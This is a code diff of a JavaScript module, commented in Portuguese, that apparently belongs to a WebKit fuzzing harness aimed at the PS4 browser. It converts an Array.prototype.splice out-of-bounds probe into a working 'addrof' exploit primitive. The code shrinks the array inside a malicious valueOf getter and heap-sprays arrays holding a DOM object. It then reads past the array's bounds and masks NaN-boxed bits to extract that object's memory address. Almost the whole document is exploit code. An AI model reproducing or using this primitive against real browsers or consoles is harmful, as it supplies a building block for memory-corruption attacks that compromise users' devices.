@@ -1,65 +1,96 @@
-﻿import { Groomer } from '../mod_groomer.js';
-
 export default {
     id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
-    category: 'CoreJS',
+    category: 'Exploit',
     risk:     'CRITICAL',
     description:
-        'Mutação do JSArray Butterfly durante a execução do C++ Array.prototype.splice. ' +
-        'O tamanho do array é reduzido a zero dentro de um getter maligno (valueOf) ' +
-        'enquanto o motor C++ está a mover os elementos. Resulta em Out-Of-Bounds (OOB).',
+        'Primitiva addrof (Address Of) via corrupção do Array Butterfly. O método splice() ' +
+        'é enganado por um getter que encolhe o array e aloca objetos vizinhos síncronamente. ' +
+        'A leitura OOB subsequente força o motor a ler o ponteiro do objeto alvo como um Float64.',
 
     setup: function() {
         this.results = {};
         
-        // Criamos o array vulnerável (Array de Doubles)
-        this.vulnArray = [];
-        for (let i = 0; i < 20; i++) {
-            this.vulnArray.push(1.111111 + i);
-        }
+        // 1. O nosso array de "Fast Doubles" (O motor acha que tudo aqui será número)
+        this.vulnArray = [1.11, 2.22, 3.33, 4.44];
+        
+        // 2. A Cobaia: O objeto C++ que queremos descobrir onde mora na RAM
+        this.targetObj = document.createElement('div');
+        this.targetObj.id = "HOLY_GRAIL";
 
         const self = this;
+        
+        // 3. A Bomba Relógio
         this.evilObject = {
             valueOf: function() {
-                // FIX: Agora aponta para o array correto e não para o próprio evilObject
+                // O GATILHO: Encolhemos o array subjacente para 0
                 self.vulnArray.length = 0;
                 
-                let trash = Groomer.sprayDOM('div', 1000);
-                return 9.999999;
+                // HEAP FENG SHUI: Agora que libertámos espaço, alocamos arrays contendo 
+                // a nossa Cobaia. A esperança é que um deles caia exatament ao lado
+                // do Butterfly do vulnArray.
+                self.targetSpray = [];
+                for(let i = 0; i < 200; i++) {
+                    self.targetSpray.push([self.targetObj]);
+                }
+                
+                return 9.99; // O valor que o splice() vai tentar inserir
             }
         };
     },
 
     trigger: function() {
         try {
-            // O GATILHO: Substituir o índice 5 pelo nosso objeto maligno.
-            // O WebKit vai ler o '.valueOf()' do objeto para o converter, disparando a nossa armadilha!
-            this.vulnArray.splice(5, 1, this.evilObject);
+            // Chamamos a função nativa. Ela vai tropeçar no nosso evilObject!
+            this.vulnArray.splice(0, 3, this.evilObject);
+            this.results.oobArray = this.vulnArray;
         } catch(e) {
             this.results.error = e.message;
         }
     },
 
     probe: [
-        // Probe 0: Qual é o tamanho final do array para o motor C++? (Deveria ser 0 ou 20)
-        s => s.vulnArray.length,
+        s => s.results.error || 'Splice Executado',
         
-        // Probe 1: Tenta ler o índice 10. Se length for 0, isto devia ser 'undefined'.
-        // Se retornar um número, o C++ está a ler memória OOB!
-        s => typeof s.vulnArray[10],
-        
-        // Probe 2: O Leitor de OOB
+        // O Extrator addrof
         s => {
-            let val = s.vulnArray[10];
-            if (typeof val === 'number' && !isNaN(val)) {
-                return `💥 SUCESSO! OOB Read (Lixo da RAM): ${val}`;
+            let arr = s.results.oobArray;
+            if (arr) {
+                // Vamos bisbilhotar fora dos limites do array
+                for (let i = 0; i < 15; i++) {
+                    let val = arr[i];
+                    
+                    // Se encontrarmos algo que seja um número, mas que NÃO seja
+                    // os valores originais que colocámos lá, apanhámos lixo da RAM vizinha!
+                    if (typeof val === 'number' && val !== 9.99 && val !== 1.11 && val !== 2.22 && val !== 3.33 && val !== 4.44 && val !== 0) {
+                        
+                        // MAGIA DE EXPLOIT: Converter o Float64 de volta para o Endereço de Memória
+                        const buf = new ArrayBuffer(8);
+                        const f64 = new Float64Array(buf);
+                        const u64 = new BigUint64Array(buf);
+                        
+                        f64[0] = val; // Colocamos o float bizarro
+                        const bits = u64[0]; // Lemos como inteiro de 64-bits
+                        
+                        // O WebKit no PS4 faz o "NaN-Boxing" de ponteiros.
+                        // Aplicamos a máscara bitwise para extrair o endereço real:
+                        const addr = bits & 0x0000FFFFFFFFFFFFn;
+                        
+                        // Se o endereço for maior que 1MB (evita falsos positivos de números pequenos)
+                        if (addr > 0x100000n) {
+                            return `🏆 ADDROF SUCESSO: 0x${addr.toString(16).toUpperCase()}`;
+                        }
+                    }
+                }
             }
-            return 'Protegido / Array Vazio';
+            return 0; // Falhou o alinhamento, o fuzzer vai tentar no próximo ciclo.
         }
     ],
 
     cleanup: function() {
         this.vulnArray = null;
         this.evilObject = null;
+        this.targetObj = null;
+        this.targetSpray = null;
+        this.results = {};
     }
 };
